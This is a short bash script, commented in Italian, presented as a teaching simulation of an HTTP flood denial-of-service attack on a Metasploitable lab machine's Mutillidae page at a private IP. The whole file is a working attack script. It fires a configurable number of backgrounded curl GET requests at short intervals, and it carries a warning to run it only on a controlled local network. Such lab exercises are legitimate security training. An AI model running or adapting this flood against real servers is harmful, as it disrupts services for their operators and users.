#!/bin/bash

# ============================================================================
# Simulazione didattica di attacco DoS verso Metasploitable (HTTP Flood)
# ============================================================================
# ATTENZIONE: Usare solo in rete locale controllata e a scopo educativo!
# ============================================================================

# Imposta l'URL del bersaglio: in questo caso, il server web di Metasploitable
TARGET="http://192.168.58.136/mutillidae/" #indirizzo da modificare a seconda dell'ip di metasploit

# Legge da linea di comando il numero di richieste da inviare (default: 100)
# Se non specificato, usa 100
REQUESTS=${1:-100}

# Legge da linea di comando il ritardo (in secondi) tra ogni richiesta (default: 0.05)
DELAY=${2:-0.05}

# Stampa informazioni iniziali per l'utente
echo "===== ATTACCO DoS DIDATTICO ====="
echo "Bersaglio   : $TARGET"
echo "Richieste   : $REQUESTS"
echo "Intervallo  : $DELAY secondi"
echo "Inizio della simulazione..."

# Avvia un ciclo che esegue un numero di richieste pari a $REQUESTS
for i in $(seq 1 $REQUESTS); do
    # Esegue una richiesta HTTP GET verso il bersaglio con curl
    # L'opzione -s (silent) sopprime output e progress bar
    # L'output viene rediretto su /dev/null per non stampare nulla a schermo
    # Il comando viene eseguito in background (&) per parallelizzare l'invio
    curl -s "$TARGET" > /dev/null &

    # Stampa il numero della richiesta in corso, aggiornando la riga corrente
    echo -ne "[$i/$REQUESTS] richiesta inviata...\r"

    # Attende un certo intervallo prima di passare alla prossima iterazione
    sleep $DELAY
done

# Dopo il ciclo, stampa messaggio di completamento simulazione
echo -e "\nSimulazione DoS completata."
